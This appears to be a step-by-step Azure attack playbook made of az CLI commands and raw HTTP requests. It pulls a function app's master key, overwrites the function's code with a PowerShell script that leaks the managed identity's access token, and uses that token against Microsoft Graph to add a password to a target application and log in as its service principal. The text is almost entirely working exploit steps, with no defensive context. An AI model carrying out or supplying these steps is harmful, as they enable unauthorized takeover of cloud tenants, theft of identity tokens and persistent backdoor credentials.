1. az login -u <\Username> -p <\Password>
2. az functionapp list --resource-group <\RGName>
3. az functionapp keys list --resource-group <\RGName> --name <\AppName>
4. az functionapp identity show --name <\AppName> --resource-group <\RGName>>
5. az rest --method GET -u "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{RGName}/providers/Microsoft.Web/sites/{FunctionAppName}/functions?api-version=2021-02-01"

Now we intercept the request and go to burp

6. 
```aidl
GET /admin/vfs/site/wwwroot/{FunctionName}/run.ps1 HTTP/1.1
Host: <FunctionAppName>.azurewebsites.net
x-functions-key: <MasterKey>
Upgrade-Insecure-Requests: 1
User-Agent: <UserAgent>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
```
7. Make sure Etag and client_id matches!
```aidl

PUT /admin/vfs/site/wwwroot/{FunctionName}/run.ps1 HTTP/1.1
Host: <FunctionAppName>.azurewebsites.net
x-functions-key: <MasterKey>
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: <UserAgent>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
If-Match: <\Etag>
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 805

using namespace System.Net

# Input bindings are passed in via param block.
param($Request, $TriggerMetadata)

# Write to the Azure Functions log stream.
Write-Host "PowerShell HTTP trigger function processed a request."

#If parameter "Scope" has not been provided, we assume that graph.microsoft.com is the target resource
$Scope = "https://graph.microsoft.com/"

$tokenAuthUri = $env:IDENTITY_ENDPOINT + "?resource=$Scope&api-version=2019-08-01&client_id={ClientId}"
$headers = @{
    "X-IDENTITY-HEADER"="$env:IDENTITY_HEADER"
}
$response = Invoke-RestMethod -Method Get -Headers $headers -Uri $tokenAuthUri -UseBasicParsing
$tokenAuthUri 
$response

$accessToken = $response.access_token
$body = "Access Token: $accessToken"

# Associate values to output bindings by calling 'Push-OutputBinding'.
Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
    StatusCode = [HttpStatusCode]::OK
    Body = $body
})
```
8. 
```aidl
GET /api/<FunctionName> HTTP/1.1
Host: <FunctionAppName>.azurewebsites.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
x-functions-key: <MasterKey>
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```
9. 
```aidl
GET /v1.0/applications HTTP/1.1
Host: graph.microsoft.com
User-Agent: <UserAgent>
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
x-ms-client-request-id: <RequestID>
CommandName: rest
ParameterSetName: --method -u
Authorization: Bearer <IdentityToken>
```
10. 
```aidl
GET /v1.0/applications/<VulnerableAppId> HTTP/1.1
Host: graph.microsoft.com
User-Agent: <UserAgent>
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
x-ms-client-request-id: <Requestid>
CommandName: rest
ParameterSetName: --method -u
Authorization: Bearer <IdentityToken>
```
11.
```aidl
POST /v1.0/applications/<VulnerableAppId>/addPassword HTTP/1.1
Host: graph.microsoft.com
User-Agent: <UserAgent>
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
x-ms-client-request-id: <RequestId
CommandName: rest
Content-type: application/json
ParameterSetName: --method -u
Authorization: Bearer <IdentityToken>
Content-Length: 81

{
  "passwordCredential": {
    "displayName": "Password friendly name"
  }
}
```
12. az login --service-principal -u <\spnID> -p <\SPNSecret> -t <\TenantID> --allow-no-subscriptions
